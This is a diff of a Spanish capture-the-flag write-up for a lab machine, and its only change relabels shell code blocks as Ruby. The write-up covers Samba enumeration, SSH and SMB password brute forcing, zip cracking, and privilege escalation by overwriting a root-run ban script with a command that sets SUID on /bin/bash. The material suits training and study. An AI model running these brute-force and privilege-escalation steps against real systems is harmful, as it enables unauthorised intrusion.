@@ -2,7 +2,7 @@
 <img width="510" height="313" alt="image" src="https://github.com/user-attachments/assets/589170ed-365a-48f9-a0b4-f90a8f9bf466" />
 
 ## Configuracion del Entorno
-```bash
+```ruby
 # Comandos para desplegar el laboratorio
 7z x memesploit.zip
 sudo bash auto_deploy.sh memesploit.tar
@@ -12,18 +12,18 @@ sudo bash auto_deploy.sh memesploit.tar
 ## Fase de Reconocimiento
 
 ### Direccion IP del Target
-```bash
+```ruby
 172.17.0.2
 ```
 ### Identificación del Target
 Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
-```bash
+```ruby
 ping -c 1 172.17.0.2 
 ```
 
 ### Determinacion del SO
 Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
-```bash
+```ruby
 wichSystem.py 172.17.0.2
 # TTL: [ 64 ] -> [ Linux ]
 ```
@@ -31,7 +31,7 @@ wichSystem.py 172.17.0.2
 ---
 ## Enumeracion de Puertos y Servicios
 ### Descubrimiento de Puertos
-```bash
+```ruby
 # Escaneo rápido con herramienta personalizada en python
 escanerTCP.py -t 172.17.0.2 -p 1-65000
 
@@ -42,12 +42,12 @@ extractPorts allPorts # Parseamos la informacion mas relevante del primer escane
 
 ### Análisis de Servicios
 Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
-```bash
+```ruby
 nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
 ```
 
 **Servicios identificados:**
-```bash
+```ruby
 22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
 80/tcp  open  http        Apache httpd 2.4.58 ((UbuntuNoble))
 139/tcp open  netbios-ssn Samba smbd 4
@@ -56,12 +56,12 @@ nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
 ---
 ## Enumeracion Servicio `Samba`
 Realizamos una enumeracion completa de todo el servicio:
-```bash
+```ruby
 enum4linux -a 172.17.0.2
 ```
 
 Tenemos los recursos compartidos:
-```bash
+```ruby
 ==================================( Share Enumeration on 172.17.0.2 )==================================
 smbXcli_negprot_smb1_done: No compatible protocol selected by server.
 
@@ -84,7 +84,7 @@ NT_STATUS_CONNECTION_REFUSED listing \*
 ```
 
 Tenemos usuarios validos:
-```bash
+```ruby
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                                                                  
 S-1-22-1-1001 Unix User\memesploit (Local User)
 S-1-22-1-1002 Unix User\memehydra (Local User)
@@ -92,27 +92,27 @@ S-1-22-1-1002 Unix User\memehydra (Local User)
 
 Realizaremos un ataque de fuerza bruta para intentar encontrar su contrasena:
 **Nota** No obtuvimos nada
-```bash
+```ruby
 crackmapexec smb 172.17.0.2 -u 'memehydra' -p /usr/share/wordlists/rockyou.txt 
 ```
 
 ## Enumeracion de [Servicio Web Principal]
 direccion **URL** del servicio:
-```bash
+```ruby
 http://172.17.0.2
 ```
 ### Tecnologías Detectadas
 Realizamos deteccion de las tecnologias empleadas por la web
-```bash
+```ruby
 whatweb http://172.17.0.2 # No reporta nada
 ```
 
 Lanzamos un script de **Nmap** para reconocimiento de rutas
-```bash
+```ruby
 nmap --script http-enum -p 80 172.17.0.2 # No reporta nada
 ```
 ### Descubrimiento de Rutas
-```bash
+```ruby
 gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
 ```
 
@@ -120,7 +120,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/d
 	No reporta nada
 
 ### Descubrimiento de Archivos
-```bash
+```ruby
 gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,pl
 ```
 
@@ -128,35 +128,35 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/d
 	No reporta nada
 
 Ahora desde la web principal tenemos tres palabras ocultas que podemos ver desde el codigo fuente:
-```bash
+```ruby
 fuerzabrutasiempre
 memesploit_ctf
 memehydra
 ```
 
 Usaremos este como diccionario para el usaurio `memehydra`
-```bash
+```ruby
 crackmapexec smb 172.17.0.2 -u 'memehydra' -p passwords.txt
 SMB         172.17.0.2      445    4E876123A74E     [*] Windows 6.1 Build 0 (name:4E876123A74E) (domain:4E876123A74E) (signing:False) (SMBv1:False)
 ```
 
 Tenemos las credenciales:
-```bash
+```ruby
 SMB         172.17.0.2      445    4E876123A74E     [+] 4E876123A74E\memehydra:fuerzabrutasiempre 
 ```
 
 Ahora nos conectamos a los recursos compartidos de este usuario:
-```bash
+```ruby
 smbclient //172.17.0.2/share_memehydra -U 'memehydra' --password 'fuerzabrutasiempre'
 ```
 
 Tenemos este archivo: **secret.zip** el cual nos descargaremos en nuestro equipo local:
-```bash
+```ruby
 smb: \> get secret.zip
 ```
 
 Si intentamos extraer su contenido nos pide una contrasnea que no tenemos:
-```bash
+```ruby
 7z x secret.zip
 
 7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
@@ -179,28 +179,28 @@ Break signaled
 ```
 
 Asi que realizaremos un ataque de fuerza bruta:
-```bash
+```ruby
 zip2john secret.zip > hash
 ```
 
 Ahora usaremos el diccionario que previamente habiamos creado con las tres palabras:
-```bash
+```ruby
 john --wordlist=passwords.txt hash
 ```
 
 Ahora tenemos la contrasena para ver el archivo:
-```bash
+```ruby
 Warning: Only 3 candidates left, minimum 16 needed for performance.
 memesploit_ctf   (secret.zip/secret.txt)
 ```
 
 Ahora volvemos a extraer los archivos:
-```bash
+```ruby
 7z x secret.zip # ( memesploit_ctf )
 ```
 
 Ahora tenemos este archivo **secret.txt** que si revisamos su contenido tenemos lo siguiente:
-```bash
+```ruby
 memesploit:metasploitelmejor
 ```
 
@@ -209,7 +209,7 @@ memesploit:metasploitelmejor
 ### Vector de Ataque
 Ahora usaremos esas credenciales para loguearnos por **ssh**
 ### Intrusion
-```bash
+```ruby
 # Reverse shell o acceso inicial
 ssh-keygen -R 172.17.0.2 && ssh memesploit@172.17.0.2 # ( metasploitelmejor )
 ```
@@ -219,7 +219,7 @@ ssh-keygen -R 172.17.0.2 && ssh memesploit@172.17.0.2 # ( metasploitelmejor )
 
 ###### Usuario `[ Memesploit ]`:
 Listando los permisos para este usuario tenemos lo siguiente:
-```bash
+```ruby
 sudo -l
 
 User memesploit may run the following commands on 4e876123a74e:
@@ -231,18 +231,18 @@ User memesploit may run the following commands on 4e876123a74e:
 2. **Herramienta de monitoreo**: Como `logind` (parte de systemd) o `lastlog`.
 3. **Componente de seguridad**: Como `fail2ban` o `pam_exec`.
 Ahora buscamos por archivos relacionados con **login_monitor**
-```bash
+```ruby
 find / -iname "login_monitor" 2>/dev/null
 ```
 
 Tenemos lo siguiente:
-```bash
+```ruby
 /etc/login_monitor
 /etc/init.d/login_monitor
 ```
 
 Ahora lo que aremos es ver los archivos de configuracion:
-```bash
+```ruby
 ls -la
 
 total 36
@@ -258,20 +258,20 @@ drwxr-xr-x 55 root root     4096 Jun 23 20:06 ..
 ```
 
 Ahora existe un directorio **.** el cual tiene como grupo propietario **security**, Revisando a los grupos a los que pertenecemos:
-```bash
+```ruby
 id
 uid=1001(memesploit) gid=1001(memesploit) groups=1001(memesploit),100(users),1003(security)
 ```
 
 Y para grupo propietario tenemos capacidad de:
-```bash
+```ruby
 r = Lectura
 w = Escritura
 x = Ejecucion
 ```
 
 Ahora revisamos todos los archivos en busca de un posible fallo:
-```bash
+```ruby
 cat actionban.sh
 
 #!/bin/bash
@@ -300,38 +300,38 @@ echo "El registro ha sido creado en $BLOCK_LOG con la IP $IP_TO_BLOCK"
 ```
 
 Ahora lo que aremos es intentar modificar el nombre de este archivo: **actionban.sh**  
-```bash
+```ruby
 mv actionban.sh actionban.txt
 ```
 
 Ahora creamos el nuestro malicioso:
-```bash
+```ruby
 nano actionban.sh
 ```
 
 con las siguientes instrucciones:
-```bash
+```ruby
 chmod u+s /bin/bash
 ```
 
 Ahora lo ejecutamos:
-```bash
+```ruby
 sudo service login_monitor restart
 ```
 
 Ahora para que se active realizaremos un ataque de fuerza bruta con **hydra**
-```bash
+```ruby
 hydra -l memesploit -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2
 ```
 
 Ahora si listamos los permisos de la **bash** tenemos **SUID**
-```bash
+```ruby
 ls -l /bin/bash
 -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
 ```
 
 Explotamos el privilegio
-```bash
+```ruby
 # Comando para escalar al usuario: ( root )
 bash -p
 ```
@@ -340,13 +340,13 @@ bash -p
 
 ## Evidencia de Compromiso
 Flags **Root**
-```bash
+```ruby
 bash-5.2# ls -la /root
 
 -rw-r--r--  1 root root   33 Aug 31  2024 root.txt
 ```
 
-```bash
+```ruby
 # Captura de pantalla o output final
 bash-5.2# whoami
 root
